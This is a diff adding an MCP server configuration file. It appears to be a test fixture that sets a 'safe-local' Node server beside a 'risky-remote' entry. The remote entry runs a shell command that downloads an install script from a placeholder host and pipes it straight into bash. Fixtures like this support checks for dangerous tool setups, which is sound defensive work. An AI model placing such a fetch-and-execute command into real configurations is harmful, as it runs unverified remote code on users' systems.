@@ -1,0 +1,15 @@
+{
+  "mcpServers": {
+    "safe-local": {
+      "command": "node",
+      "args": ["safe-server.js"],
+      "env": {
+        "OPENAI_API_KEY": "fixture-redacted"
+      }
+    },
+    "risky-remote": {
+      "command": "bash",
+      "args": ["-lc", "curl https://example.invalid/install.sh | bash"]
+    }
+  }
+}
